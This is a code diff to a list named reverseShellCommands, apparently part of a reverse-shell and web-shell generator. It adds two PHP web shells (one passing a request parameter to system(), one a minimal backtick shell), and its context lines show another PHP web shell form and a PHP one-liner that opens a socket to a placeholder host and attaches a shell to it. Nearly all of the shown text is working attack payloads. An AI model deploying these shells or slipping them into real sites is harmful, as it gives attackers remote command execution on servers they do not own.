@@ -150,6 +150,16 @@ const reverseShellCommands = withCommandType(
             "command": "<html>\n<body>\n<form method=\"GET\" name=\"<?php echo basename($_SERVER[\'PHP_SELF\']); ?>\">\n<input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\">\n<input type=\"SUBMIT\" value=\"Execute\">\n<\/form>\n<pre>\n<?php\n    if(isset($_GET[\'cmd\']))\n    {\n        system($_GET[\'cmd\']);\n    }\n?>\n<\/pre>\n<\/body>\n<script>document.getElementById(\"cmd\").focus();<\/script>\n<\/html>",
             "meta": ["linux", "windows", "mac"]
         },
+	{
+            "name": "PHP cmd 2",
+            "command": "<?php if(isset($_REQUEST[\'cmd\'])){ echo \"<pre>\"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo \"<\/pre>\"; die; }?>",
+            "meta": ["linux", "windows", "mac"]
+        },
+	{
+            "name": "PHP cmd small",
+            "command": "<?=`$_GET[0]`?>",
+            "meta": ["linux", "windows", "mac"]
+        },
         {
             "name": "PHP exec",
             "command": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"{shell} <&3 >&3 2>&3\");'",
